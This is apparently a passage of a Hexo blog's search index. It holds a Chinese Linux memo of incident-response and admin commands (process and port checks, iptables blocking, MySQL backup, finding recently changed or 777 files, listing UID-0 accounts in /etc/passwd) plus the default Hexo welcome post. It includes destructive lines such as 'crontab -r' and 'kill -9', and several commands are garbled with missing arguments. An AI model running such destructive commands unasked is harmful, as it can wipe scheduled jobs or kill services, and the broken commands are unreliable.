netstat -lx</p></blockquote><h2 id="查看已建立的网络连接及进程"><a href="#查看已建立的网络连接及进程" class="headerlink" title="查看已建立的网络连接及进程"></a>查看已建立的网络连接及进程</h2><p><code>netstat -antulp | grep EST</code></p><h2 id="查看指定端口被哪个进程占用"><a href="#查看指定端口被哪个进程占用" class="headerlink" title="查看指定端口被哪个进程占用"></a>查看指定端口被哪个进程占用</h2><p><code>lsof -i:端口号</code>或者 <code>netstat -tunlp | grep 端口号</code></p><h1 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h1><blockquote><p>ps命令能提供一份当前进程的快照。如果想状态可以自动刷新，可以使用top命令。<br>显示所有运行中的进程：ps aux | less<br>-A：显示所有进程<br>a：显示终端中包括其它用户的所有进程<br>x：显示无控制终端的进程<br>查看非root运行的进程：ps -U root -u root -N</p></blockquote><blockquote><p><code>ps -aux | grep pid或者进程名</code><br>ps -aux | grep tomcat</p></blockquote><blockquote><p>结束进程命令<br>kill PID<br>killall &lt;进程名&gt;　　<br>kill -9 <PID>　</PID></p></blockquote><h2 id="使用ps命令，分析进程"><a href="#使用ps命令，分析进程" class="headerlink" title="使用ps命令，分析进程"></a><code>使用ps命令，分析进程</code></h2><blockquote><p>ps aux | grep pid | grep –v grep<br>可以使用<code>lsof -i:1677</code> 查看指定端口对应的程序</p></blockquote><h1 id="封杀某个IP或者ip段"><a href="#封杀某个IP或者ip段" class="headerlink" title="封杀某个IP或者ip段"></a>封杀某个IP或者ip段</h1><blockquote><p>如：<br>iptables -I INPUT -s 123.45.6.7 -j DROP       #屏蔽单个IP的命令<br>iptables -I INPUT -s 123.0.0.0/8 -j DROP      #封整个段即从123.0.0.1到123.255.255.254的命令<br>禁止从某个主机ssh远程访问登陆到本机，如　<br>iptable -t filter -A INPUT -s . -p tcp –dport  -j DROP　<br>iptables -I INPUT -s 123.45.6.7 -j ACCEPT</p><p>查看已添加的iptables规则<br>iptables -L -n -v</p><p>删除已添加的iptables规则<br>将所有iptables以序号标记显示，执行：<br>iptables -L -n –line-numbers<br>比如要删除INPUT里序号为8的规则，执行：<br>iptables -D INPUT 8</p></blockquote><h1 id="mysql备份"><a href="#mysql备份" class="headerlink" title="mysql备份"></a>mysql备份</h1><blockquote><p>mysqldump -u 用户名 -p 密码 数据库名 &gt; back.sql　　　　<br>mysqldump –all-databases &gt; bak.sql　　　　　　<br>还原mysql数据库<br>mysql -u 用户名 -p 密码 数据库名 &lt; bak.sql　</p></blockquote><h1 id="find"><a href="#find" class="headerlink" title="find"></a>find</h1><blockquote><p>在/home目录下查找以.txt结尾的文件名<br><code>find /home -name &quot;*.txt&quot;</code><br><code>find /home -iname &quot;*.txt&quot;</code>    忽略大小写</p><p>当前目录及子目录下查找所有以.txt和.pdf结尾的文件<br>find . ( -name “<em>.txt” -o -name “</em>.pdf” )<br>或<br>find . -name “<em>.txt” -o -name “</em>.pdf” </p></blockquote><h1 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h1><blockquote><p><code>awk -F&quot;:&quot; &#39;{print $1}&#39;  /etc/passwd</code><br><code>awk -F: &#39;{print $1; print $2}&#39;   /etc/passwd</code>               //将每一行的前二个字段，分行输出，进一步理解一行一行处理文本<br><code>awk  -F: &#39;{print $1,$3,$6}&#39; OFS=&quot;\t&quot; /etc/passwd</code>      //输出字段1,3,6，以制表符作为分隔符</p><p>查看UID为0的帐号：<code>awk -F: &#39;{if($3==0)print $1}&#39; /etc/passwd</code><br>##crontab<br>指定包含待执行任务的crontab文件<br>sudo crontab -l -u www-data<br>sudo crontab -r -u www-data</p></blockquote><h1 id="string"><a href="#string" class="headerlink" title="string"></a>string</h1><blockquote><p>列出ls中所有的ASCII文本：<br>strings /bin/ls<br>列出ls中所有的ASCII文本：<br>cat /bin/ls strings<br>查找ls中包含libc的字符串，不区分大小写：<br><code>strings /bin/ls | grep -i libc</code></p></blockquote><h1 id="查看页面访问排名前十的IP"><a href="#查看页面访问排名前十的IP" class="headerlink" title="查看页面访问排名前十的IP"></a>查看页面访问排名前十的IP</h1><p>cat /var/log/apache2/access.log | cut -f1 -d   | sort | uniq -c | sort -k  -r | head -　　<br>##查看页面访问排名前十的URL<br>cat /var/log/apache2/access.log | cut -f4 -d   | sort | uniq -c | sort -k  -r | head -</p><h1 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h1><h2 id="敏感目录的文件分析"><a href="#敏感目录的文件分析" class="headerlink" title="敏感目录的文件分析"></a>敏感目录的文件分析</h2><blockquote><p>查看tmp目录下的文件： ls –alt /tmp/<br>查看开机启动项内容：ls -alt /etc/init.d/<br>查看指定目录下文件时间的排序：ls  -alt  | head -n 10</p><p>针对可疑文件可以使用stat进行创建修改时间、访问时间的详细查看，若修改时间距离事件日期接近，有   线性关联，说明可能被篡改或者其他。</p></blockquote><h2 id="新增文件分析"><a href="#新增文件分析" class="headerlink" title="新增文件分析"></a>新增文件分析</h2><blockquote><p>例如要查找24小时内被修改的php文件： <code>find ./ -mtime 0 -name &quot;*.php&quot;</code><br>（最后一次修改发生在距离当前时间n24小时至(n+1)24 小时）<br>查找72小时内新增的文件<code>find / -ctime -2</code><br>PS：-ctime 内容未改变权限改变时候也可以查出<br>根据确定时间去反推变更的文件<br><code>ls -al /tmp | grep &quot;Feb 27&quot;</code></p></blockquote><h2 id="特殊权限的文件"><a href="#特殊权限的文件" class="headerlink" title="特殊权限的文件"></a>特殊权限的文件</h2><blockquote><p>查找777的权限的文件   find  /  *.jsp  -perm 4777  </p><p>隐藏的文件（以 “.”开头的具有隐藏属性的文件）</p><p>在文件分析过程中，手工排查频率较高的命令是 find grep ls 核心目的是为了关联推理出可疑文件。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo</title>
      <link href="/2017/03/23/hexo/"/>
      <url>/2017/03/23/hexo/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
